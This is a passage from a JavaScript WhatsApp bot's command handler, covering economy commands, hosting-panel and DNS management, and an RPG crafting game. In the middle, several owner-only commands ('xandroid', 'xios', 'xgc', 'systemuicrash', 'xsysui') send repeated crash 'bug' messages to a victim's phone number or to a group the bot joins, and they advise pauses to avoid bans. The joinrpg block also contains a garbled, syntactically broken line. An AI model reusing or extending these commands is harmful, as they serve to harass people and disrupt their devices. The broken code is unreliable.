await gameCasinoSolo(sock, m, prefix, db.data.users);
}
break;

case 'daily': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
await daily(sock, m, db.data.users);
}
break;

case 'transferlimit': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
await transferLimit(sock, m, args, db.data.users);
}
break;

case 'transfermoney': 
case 'transferuang': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
await transferUang(sock, m, args, db.data.users);
}
break;

case 'buy': {
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
await buy(m, args, db.data.users);
}
break;
case '1gb': case '2gb': case '3gb': case '4gb': case '5gb': case '6gb': case '7gb': case '8gb': case '9gb': case '10gb': case '11gb': case '12gb': case '13gb': case '14gb': case '15gb': case '16gb': case '17gb': case '18gb': case '19gb': case '20gb': case '21gb': case '22gb': case '23gb': case '24gb': case '25gb': case '26gb': case '27gb': case '28gb': case '29gb': case '30gb': case '31gb': case '32gb': case '33gb': case '34gb': case '35gb': case '36gb': case '37gb': case '38gb': case '39gb': case '40gb': case '41gb': case '42gb': case '43gb': case '44gb': case '45gb': case '46gb': case '47gb': case '48gb': case '49gb': case '50gb': {
	if (!isCreator) return newReply(mess.owner);
	if (!text) {
		return newReply(
			`⚠️ Please enter a valid *username or number*.\n\n` +
			`💁 *Example:*\n` +
			`${prefix + command} John Doe`
		);
	}

	let input = text.split(",");
	let username = input[0].trim();

	if (!username) {
		return newReply(
			`⚠️ Please enter a valid *username or number*.\n\n` +
			`💁 *Example:*\n` +
			`${prefix + command} John Doe`
		);
	}

	try {
		const email = (username + '@users.com').toLowerCase();
		const password = randomBytes(5).toString("hex");
		const size = command.replace('gb', '');
		const memo = `${size}200`;
		const cpu = size * 2 * 10;
		const disk = `${size}200`;

		const userData = await createUser(email, username, password);
		if (!userData.errors) {
			const eggData = await getEggStartupCommand();
			const startup_cmd = eggData.attributes.startup;

			const serverData = await createServer(
				`${username} ${command.toUpperCase()}`,
				userData.attributes.id,
				startup_cmd,
				memo,
				cpu,
				disk
			);

			if (serverData.errors) {
				return newReply(
					`❌ *An issue occurred while creating the server.*\n` +
					`🛠️ *Details:* \n\`\`\`${JSON.stringify(serverData.errors[0], null, 2)}\`\`\``
				);
			}

			let responseText = `✅ *Panel created successfully!*\n\n`;
			responseText += `👤 *User Information:*\n`;
			responseText += `🆔 *ID:* \`${userData.attributes.id}\`\n`;
			responseText += `📛 *Username:* \`${userData.attributes.username}\`\n`;
			responseText += `📩 *Email:* \`${userData.attributes.email}\`\n\n`;
			responseText += `🖥️ *Server Details:*\n`;
			responseText += `🆔 *ID:* \`${serverData.attributes.id}\`\n`;
			responseText += `📌 *Name:* \`${serverData.attributes.name}\`\n`;
			responseText += `💾 *Memory:* \`${serverData.attributes.limits.memory}MB\`\n`;
			responseText += `📦 *Disk:* \`${serverData.attributes.limits.disk}MB\`\n`;
			responseText += `⚙️ *CPU:* \`${serverData.attributes.limits.cpu}%\`\n`;

			await newReply(responseText);

			let loginText = `🔑 *Panel Account Details:*\n\n`;
			loginText += `📩 *Email:* \`${email}\`\n`;
			loginText += `📛 *Username:* \`${userData.attributes.username}\`\n`;
			loginText += `🔐 *Password:* \`${password}\`\n`;
			loginText += `🌍 *Panel Login:* ${panel}\n\n`;
			loginText += `📌 Save this information securely to log into your panel. 😊`;

			await newReply(loginText);
		} else {
			newReply(
				`❌ *An issue occurred while creating the account.*\n` +
				`🛠️ *Details:* \n\`\`\`${JSON.stringify(userData.errors[0], null, 2)}\`\`\``
			);
		}
	} catch (error) {
		console.error(error);
		newReply(
			`❌ *Oops, an error occurred!*\n` +
			`🛠️ *Details:* \n\`\`\`${error.message}\`\`\``
		);
	}

	break;
}

case 'unli': {
	if (!isCreator) return newReply(mess.owner);
	if (!text) {
		return newReply(
			`⚠️ Please enter a valid *username or number*.\n\n` +
			`💁 *Example:*\n` +
			`${prefix + command} John Doe`
		);
	}

	let input = text.split(",");
	let username = input[0].trim();

	if (!username) {
		return newReply(
			`⚠️ Please enter a valid *username or number*.\n\n` +
			`💁 *Example:*\n` +
			`${prefix + command} John Doe`
		);
	}

	try {
		const email = (input[0] + '@users.com').toLowerCase();
		const password = randomBytes(5).toString("hex");
		const size = "0";
		const memo = "0";
		const cpu = "0";
		const disk = "0";

		const userData = await createUser(email, username, password);
		if (!userData.errors) {
			const eggData = await getEggStartupCommand();
			const startup_cmd = eggData.attributes.startup;

			const serverData = await createServer(
				`${username} ${command}`,
				userData.attributes.id,
				startup_cmd,
				memo,
				cpu,
				disk
			);

			if (serverData.errors) {
				return newReply(
					`❌ *An issue occurred while creating the server.*\n` +
					`🛠️ *Details:* \n\`\`\`${JSON.stringify(serverData.errors[0], null, 2)}\`\`\``
				);
			}

			let responseText = `✅ *Panel created successfully!*\n\n`;
			responseText += `👤 *User Information:*\n`;
			responseText += `🆔 *ID:* \`${userData.attributes.id}\`\n`;
			responseText += `📛 *Username:* \`${userData.attributes.username}\`\n`;
			responseText += `📩 *Email:* \`${userData.attributes.email}\`\n\n`;
			responseText += `🖥️ *Server Details:*\n`;
			responseText += `🆔 *ID:* \`${serverData.attributes.id}\`\n`;
			responseText += `📌 *Name:* \`${serverData.attributes.name}\`\n`;
			responseText += `💾 *Memory:* \`${serverData.attributes.limits.memory}MB\`\n`;
			responseText += `📦 *Disk:* \`${serverData.attributes.limits.disk}MB\`\n`;
			responseText += `⚙️ *CPU:* \`${serverData.attributes.limits.cpu}%\`\n`;

			await newReply(responseText);

			let loginText = `🔑 *Panel Account Details:*\n\n`;
			loginText += `📩 *Email:* \`${email}\`\n`;
			loginText += `📛 *Username:* \`${userData.attributes.username}\`\n`;
			loginText += `🔐 *Password:* \`${password}\`\n`;
			loginText += `🌍 *Panel Login:* ${panel}\n\n`;
			loginText += `📌 Save this information securely to log into your panel. 😊`;

			await newReply(loginText);
		} else {
			newReply(
				`❌ *An issue occurred while creating the account.*\n` +
				`🛠️ *Details:* \n\`\`\`${JSON.stringify(userData.errors[0], null, 2)}\`\`\``
			);
		}
	} catch (error) {
		console.error(error);
		newReply(
			`❌ *Oops, an error occurred!*\n` +
			`🛠️ *Details:* \n\`\`\`${error.message}\`\`\``
		);
	}

	break;
}

case 'listsubdo': {
	if (!isCreator) return newReply(mess.owner);

	try {
		let records = await getDnsRecords();

		if (typeof records === "string") return newReply(records);
		if (records.length === 0) return newReply("📂 No registered subdomains.");

		let responseText = "📜 *Cloudflare Subdomain List* 📜\n\n";
		for (let record of records) {
			responseText += `🆔 *ID*: \`${record.id}\`\n`; // ID in code format (can be copied)
			responseText += `📌 *Type*: ${record.type}\n`;
			responseText += `🌐 *Name*: ${record.name}\n`;
			responseText += `➡️ *Target*: ${record.content}\n\n`;
		}

		await newReply(responseText); // Enable Markdown parsing
	} catch (error) {
		console.error(error);
		newReply(`❌ *An error occurred*: ${error.message}`);
	}
}
break;

case 'addsubdo': {
	if (!isCreator) return newReply(mess.owner);

	let [type, name, content] = args;
	if (!type || !name || !content) return newReply(`⚠️ Use format: ${prefix + command} <Type> <Name> <Target>\n\n*Example:* ${prefix + command} A www 192.168.1.1`);

	try {
		let result = await createDnsRecord(type, name, content);
		newReply(result);
	} catch (error) {
		console.error(error);
		newReply(`❌ *An error occurred*: ${error.message}`);
	}
}
break;

case 'delsubdo': {
	if (!isCreator) return newReply(mess.owner);

	let recordId = args[0];
	if (!recordId) return newReply(`⚠️ Please provide the *ID* of the subdomain to delete.\n\nUse ${prefix}listsubdo to view subdomain IDs.`);

	try {
		let result = await deleteDnsRecord(recordId);
		newReply(result);
	} catch (error) {
		console.error(error);
		newReply(`❌ *An error occurred*: ${error.message}`);
	}
}
break;

case "xandroid": {
	if (!isCreator) return newReply(mess.owner)
	if (!text) return newReply(`Use the correct format! *Send command*: ${prefix + command} number,amount\nExample: ${prefix + command} 6281234567890,10`);
	let number = text.split(',')[0];
	let amount = text.split(',')[1] * 5;
	if (!number || !amount) {
		return newReply(`Don't forget to fill in! Use format: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	}
	if (isNaN(parseInt(amount))) {
		return newReply(`Amount must be a number, don't confuse me! 😅`);
	}
	let cleanedNumber = number.replace(/[^0-9]/g, '');
	let encodedAmount = '' + encodeURI(amount);
	let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
	let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
	if (cleanedNumber == ownerNumber) {
		return;
	}
	if (contactInfo.length == 0) {
		return newReply(`This number is not registered on WhatsApp, so I can't send the bug. 😓`);
	}
	newReply("Wait a moment, the bug process is running... 😏");
	await sleep(2000);
	sendVariousMessages(whatsappNumber, encodedAmount);
	await sleep(2500);
	sendMessageWithMentions(`Yeay! Bug successfully sent to @${whatsappNumber.split('@')[0]} with *${command}* ✅\n\nNow rest for a while so the bot doesn't get banned, wait 2 minutes. 😉`, [whatsappNumber]);
}
break;

case "xandro": {
	if (!isCreator) return newReply(mess.owner)
	if (!isBot) {
		return newReply(`This feature is only for bots, so you can't use it. 🤖`);
	}
	if (!text) {
		return newReply(`Come on, fill in the amount first! Use format: ${prefix + command} 5`);
	}
	if (isNaN(parseInt(text))) {
		return newReply(`Amount must be a number! 😅`);
	}
	let encodedValue = encodeURI(text) * 200;
	newReply(`Wait a moment, the bug is being processed... 😏`);
	await sleep(1500);
	sendVariousMessages(from, encodedValue);
	await sleep(2500);
	m.react('✅');
}
break;

case "xios": {
	if (!isCreator) return newReply(mess.owner)
	if (!text) return newReply(`Wrong format! Use ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	let number = text.split(',')[0];
	let amount = text.split(',')[1] * 5;
	if (!number || !amount) {
		return newReply(`You forgot to enter the number and amount! 😅\nUse format: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	}
	if (isNaN(parseInt(amount))) {
		return newReply(`Amount must be a number, don't type randomly! 😬`);
	}
	let cleanedNumber = number.replace(/[^0-9]/g, '');
	let encodedAmount = '' + encodeURI(amount);
	let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
	let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
	if (cleanedNumber == ownerNumber) {
		return;
	}
	if (contactInfo.length == 0) {
		return newReply(`This number is not registered on WhatsApp, can't send bug. 😓`);
	}
	newReply("Wait a moment, the bug is being processed... 😏");
	await sleep(2000); 
	sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
	await sleep(2500); 
	sendMessageWithMentions(`Yeay! Bug successfully sent to @${whatsappNumber.split('@')[0]} using *${command}* ✅\n\nNow rest for a while, wait 2 minutes so the bot doesn't get banned! 😉`, [whatsappNumber]);
}
break;

case "xiosys": {
	if (!isCreator) return newReply(mess.owner)
	if (!isBot) {
		return newReply(`This feature is only for bots, not for humans 🤖`);
	}
	if (!text) {
		return newReply(`Use the correct format! *Send command*: ${prefix + command} 5`);
	}
	if (isNaN(parseInt(text))) {
		return newReply(`Amount must be a number, don't type randomly! 😬`);
	}
	let encodedValue = encodeURI(text) * 200; 
	newReply("Wait a moment, the bug is being processed... 😏");
	await sleep(1500); 
	sendMultiplePaymentInvites(from, encodedValue);
	await sleep(2500); 
	m.react('✅');
}
break;

case "xgc": {
	if (!isCreator) return newReply(mess.owner)
	if (!text) {
		return newReply(`*HOW TO SEND BUG TO GROUP*\n\nUse format: ${prefix + command} https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send bugs in large quantities, type like this:\n\n*Send command*: .${command} gc_link amount\n\n*Send command*: .${command} https://chat.whatsapp.com/xxxx 10`);
	}
	newReply(`Wait, the bug is being processed... 😏`);
	if (!text.split(" ")[0].includes("whatsapp.com")) {
		return newReply(`The link is invalid, please check again! ❌`);
	}
	let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
	try {
		let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
		let groupTarget = await sock.groupAcceptInvite(groupLink);
		await sleep(2000);
		sendViewOnceMessages(groupTarget, bugAmount);
		await sleep(2500);
		newReply(`Done! ✅ Bug successfully sent to group!`);
		sock.groupLeave(groupTarget);
	} catch (error) {
		newReply(`Oops, something went wrong! 😣\n\n${util.format(error)}`);
	}
}
break;

case "systemuicrash": {
	if (!isCreator) return newReply(mess.owner)
	if (!text) return newReply(`Use format like this: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	let number = text.split(',')[0];
	let amount = text.split(',')[1] * 5;
	if (!number || !amount) {
		return newReply(`Use correct format: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	}
	if (isNaN(parseInt(amount))) {
		return newReply("Amount must be a number! 😅");
	}
	let cleanedNumber = number.replace(/[^0-9]/g, '');
	let encodedAmount = '' + encodeURI(amount);
	let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
	let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
	if (cleanedNumber == ownerNumber) {
		return;
	}
	if (contactInfo.length == 0) {
		return newReply("This number is not registered on WhatsApp! 🙁");
	}
	newReply("Wait a moment, the bug is being processed... 😏");
	await sleep(2000); 
	sendMixedMessages(whatsappNumber, encodedAmount);	
	await sleep(2500); 
	sendMessageWithMentions(`Successfully sent bug to @${whatsappNumber.split('@')[0]} using *${command}* ✅\n\nPause 2 minutes so the bot doesn't get banned.`, [whatsappNumber]);
}
break;

case "xsysui": {
	if (!isCreator) return newReply(mess.owner)
	if (!text) return newReply(`Use format: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	let number = text.split(',')[0];
	let amount = text.split(',')[1] * 5; 
	if (!number || !amount) {
		return newReply(`Use correct format: ${prefix + command} number,amount\n*Send command*: ${prefix + command} 6281234567890,10`);
	}
	if (isNaN(parseInt(amount))) {
		return newReply("Amount must be a number! 😅");
	}
	let cleanedNumber = number.replace(/[^0-9]/g, '');
	let encodedAmount = '' + encodeURI(amount);
	let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
	let whatsappNumber = cleanedNumber + '@s.whatsapp.net'; 
	if (cleanedNumber == ownerNumber) {
		return;
	}
	if (contactInfo.length == 0) {
		return newReply("This number is not registered on WhatsApp! 🙁");
	}
	newReply("Wait a moment, the bug is being processed... 😏");
	await sleep(2000); 
	sendRepeatedMessages2(whatsappNumber, encodedAmount);	
	await sleep(2500); 
	sendMessageWithMentions(`Successfully sent bug to @${whatsappNumber.split('@')[0]} using *${command}* ✅\n\nPause 2 minutes so the bot doesn't get banned.`, [whatsappNumber]);
}
break;

case 'joinrpg': {
	if (db.data.users[m.sender].rpg) 
		return newReply(`⚠️ *You have already joined the RPG before!*`);

	db.data.users[m.sender].rpg = true;

	let text = `🎮 *RPG GAME STARTED!*\n\n✅ You have joined the RPG-Game.\n🔹 Now you can use RPG commands!\n`;

	await sock.sendMessage(m.chat, {
		text: text,
		contextInfo: {
			mentionedJid: [m.sender],
		[m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: channel,
							serverMessageId: null,
							newsletterName: channelName
						},
						externalAdReply: {
							title: "🏴‍☠️ RPG-GAME (Pirate Adventure)",
							body: "Pirate adventure searching for treasure!",
							thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { quoted: m });
			}
			break;

			case 'mining': {
				if (!db.data.users[m.sender].rpg) 
					return newReply(`⚠️ *Join the RPG first!*\n\nType _.joinrpg_`);
	
				if (!db.data.rpg[m.sender].pickaxe) 
					return newReply(`⚠️ *You don't have a Pickaxe!*\nCreate one first with _.craft_`);
	
				if (db.data.rpg[m.sender].pickaxeHealth < 1) 
					return newReply(`☹️ *Your Pickaxe is broken!*\nRepair it first with _.repair_`);

				let miningResults = {
					iron: [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9],
					coal: [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0],
					gold: [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0],
					silver: [2, 1, 3, 5, 0, 0, 0, 0, 0, 2, 1, 0, 8, 2]
				};

				let result = {};
				for (let item in miningResults) {
					result[item] = await pickRandom(miningResults[item]);
					db.data.rpg[m.sender][item] += result[item];
				}

				let miningText = `⛏️ *MINING ADVENTURE*\n\n🔹 **Mining Results:**\n`;
				miningText += ` 🔩 Iron: ${result.iron}\n 🪨 Coal: ${result.coal}\n 💰 Gold: ${result.gold}\n ⚪ Silver: ${result.silver}\n\n`;
				miningText += `✅ *Items stored in inventory!*\n❤️ *Health decreased by 20*\n⛏️ *Pickaxe Durability: ${db.data.rpg[m.sender].pickaxeHealth - 20}%*`;

				db.data.rpg[m.sender].pickaxeHealth -= 20;

				await sock.sendMessage(m.chat, {
					text: miningText,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: channel,
							serverMessageId: null,
							newsletterName: channelName
						},
						externalAdReply: {
							title: "⛏️ RPG-GAME (Mining Resource)",
							body: "Mine natural resources!",
							thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { quoted: m });

				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'heal': {
				if (!db.data.users[m.sender].rpg) 
					return newReply(`⚠️ *Join the RPG first!*\n\nType _.joinrpg_`);
	
				if (db.data.rpg[m.sender].userHealth >= 100) 
					return newReply(`✅ *You're still healthy, no need to heal!*`);

				db.data.rpg[m.sender].userHealth = 100;

				editp("🛌 Resting body...", "🩹 Recovering...", "❤️ *Your health has been restored!*");

				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'crafting':
			case 'craft': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG First*\n\ntype _.joinrpg_`)
				if (args[0] === "fabric") {
					if (!args[1]) return newReply(`*Enter the amount!*\n\nExample:\n.craft fabric 1\n\nTo make 1 Fabric Sheet requires *2 Wolf Fur*.\n\nPlease get fur first!`)
					if (isNaN(args[1])) return newReply(`*Amount must be a number!*\n\nExample:\n.craft fabric 1\n\nTo make 1 Fabric Sheet requires *2 Wolf Fur*.\n\nPlease get fur first!`)
					let fur = Number(parseInt(args[1]) * 2)
					if (db.data.rpg[m.sender].fur < fur) return newReply(`*Your Wolf Fur (${db.data.rpg[m.sender].fur}) is not enough to make ${args[1]} Fabric Sheets*\n\nTo make 1 Fabric Sheet requires *2 Wolf Fur*.\n\nPlease get fur first!`)
					db.data.rpg[m.sender].fabric += parseInt(args[1])
					db.data.rpg[m.sender].fur -= fur
					newReply(`Successfully made ${args[1]} Fabric Sheets, you have ${db.data.rpg[m.sender].fur} Fur left`)
				} else if (args[0] === "ship") {
					if (db.data.rpg[m.sender].ship) return newReply('You already have a Ship!')
					let iron = Number(20)
					let wood = Number(50)
					let fabric = Number(2)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make a Ship*\n\nTo make a Ship requires *20 Iron, 50 Wood, 2 Fabric*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make a Ship*\n\nTo make a Ship requires *20 Iron, 50 Wood, 2 Fabric*.\n\nPlease Chop/Adventure first!`)
					if (db.data.rpg[m.sender].fabric < fabric) return newReply(`*Your Fabric (${db.data.rpg[m.sender].fabric}) is not enough to make a Ship*\n\nTo make a Ship requires *20 Iron, 50 Wood, 2 Fabric*.\n\nPlease Craft Fabric first!`)
					db.data.rpg[m.sender].ship = true
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					db.data.rpg[m.sender].fabric -= fabric
					let ship = `*Successfully made a Ship!*\n\nRemaining Resources:\n- Iron: ${db.data.rpg[m.sender].iron}\n- Fabric: ${db.data.rpg[m.sender].fabric}\n- Wood: ${db.data.rpg[m.sender].wood}\n\n`
					await sock.sendMessage(m.chat, {
						text: ship,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Pirate Ship)",
								body: 'Build a pirate ship',
								thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "axe") {
					if (db.data.rpg[m.sender].axe) return newReply('You already have an Axe!')
					let iron = Number(2)
					let wood = Number(1)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make an Axe*\n\nTo make an Axe requires *2 Iron, 1 Wood*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make an Axe*\n\nTo make an Axe requires *2 Iron, 1 Wood*.\n\nPlease Chop/Adventure first!`)
					db.data.rpg[m.sender].axe = true
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					let axe = `*Successfully made an Axe!*\n\nRemaining Resources:\n- Iron: ${db.data.rpg[m.sender].iron}\n- Wood: ${db.data.rpg[m.sender].wood}\n\n`
					await sock.sendMessage(m.chat, {
						text: axe,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "house") {
					if (!(`${db.data.rpg[m.sender].houselocation}` === `${db.data.rpg[m.sender].region}`)) return newReply(`You are currently in ${db.data.rpg[m.sender].region}, You can only build a house in Indonesia, Please sail back to Indonesia to build a house`)
					if (!args[1]) return newReply('*Enter the amount!*\n\nExample:\n.craft house 1\n\nTo make 1 House requires *6 Iron, 20 Wood*. Make sure your resources are enough!')
					if (isNaN(args[1])) return newReply('*Amount must be a number!*\n\nExample:\n.craft house 1\n\nTo make 1 House requires *6 Iron, 20 Wood*. Make sure your resources are enough!')
					let iron = Number(parseInt(args[1]) * 6)
					let wood = Number(parseInt(args[1]) * 20)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make a House*\n\nTo make a House requires *6 Iron, 20 Wood*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make a House*\n\nTo make a House requires *6 Iron, 20 Wood*.\n\nPlease Chop/Adventure first!`)
					db.data.rpg[m.sender].house += parseInt(args[1])
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					let house = `*Successfully made ${args[1]} House(s)!*\n\nAmount: ${args[1]} House(s)\nLocation: Indonesia\n\n`
					await sock.sendMessage(m.chat, {
						text: house,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (House Crafting)",
								body: 'Build a house to rest',
								thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "pickaxe") {
					if (db.data.rpg[m.sender].pickaxe) return newReply('You already have a Pickaxe!')
					let iron = Number(2)
					let wood = Number(1)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make a Pickaxe*\n\nTo make a Pickaxe requires *2 Iron, 1 Wood*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make a Pickaxe*\n\nTo make a Pickaxe requires *2 Iron, 1 Wood*.\n\nPlease Chop/Adventure first!`)
					db.data.rpg[m.sender].pickaxe = true
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					let pickaxe = `*Successfully made a Pickaxe!*\n\nRemaining Resources:\n- Iron: ${db.data.rpg[m.sender].iron}\n- Wood: ${db.data.rpg[m.sender].wood}\n\n`
					await sock.sendMessage(m.chat, {
						text: pickaxe,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "armor") {
					if (db.data.rpg[m.sender].armor) return newReply('You already have Armor!')
					let iron = Number(6)
					let wood = Number(2)
					let fabric = Number(10)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make Armor*\n\nTo make Armor requires *6 Iron, 2 Wood, 10 Fabric*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make Armor*\n\nTo make Armor requires *6 Iron, 2 Wood, 10 Fabric*.\n\nPlease Chop/Adventure first!`)
					if (db.data.rpg[m.sender].fabric < fabric) return newReply(`*Your Fabric (${db.data.rpg[m.sender].fabric}) is not enough to make Armor*\n\nTo make Armor requires *6 Iron, 2 Wood, 10 Fabric*.\n\nPlease Craft Fabric first!`)
					db.data.rpg[m.sender].armor = true
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					db.data.rpg[m.sender].fabric -= fabric
					let armor = `*Successfully made Armor!*\n\nRemaining Resources:\n- Iron: ${db.data.rpg[m.sender].iron}\n- Wood: ${db.data.rpg[m.sender].wood}\n- Fabric: ${db.data.rpg[m.sender].fabric}\n\n`
					await sock.sendMessage(m.chat, {
						text: armor,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "sword") {
					if (db.data.rpg[m.sender].sword) return newReply('You already have a Sword!')
					let iron = Number(3)
					let wood = Number(1)
					if (db.data.rpg[m.sender].iron < iron) return newReply(`*Your Iron (${db.data.rpg[m.sender].iron}) is not enough to make a Sword*\n\nTo make a Sword requires *3 Iron, 1 Wood*.\n\nPlease Mine/Adventure first!`)
					if (db.data.rpg[m.sender].wood < wood) return newReply(`*Your Wood (${db.data.rpg[m.sender].wood}) is not enough to make a Sword*\n\nTo make a Sword requires *3 Iron, 1 Wood*.\n\nPlease Chop/Adventure first!`)
					db.data.rpg[m.sender].sword = true
					db.data.rpg[m.sender].iron -= iron
					db.data.rpg[m.sender].wood -= wood
					let sword = `*Successfully made a Sword!*\n\nRemaining Resources:\n- Iron: ${db.data.rpg[m.sender].iron}\n- Wood: ${db.data.rpg[m.sender].wood}\n\n`
					await sock.sendMessage(m.chat, {
						text: sword,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else {
					let craft = "";
					craft += "*What do you want to craft?*\n\n";
					craft += "- ship\n";
					craft += "- house\n";
					craft += "- axe\n";
					craft += "- pickaxe\n";
					craft += "- sword\n";
					craft += "- armor\n";
					craft += "- fabric\n\n";
					craft += "*Example:*\n";
					craft += ".craft axe\n";
					await sock.sendMessage(m.chat, {
						text: craft,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "RPG-GAME (Crafting Item)",
								body: 'Make items for survival and adventure',
								thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'sail': {
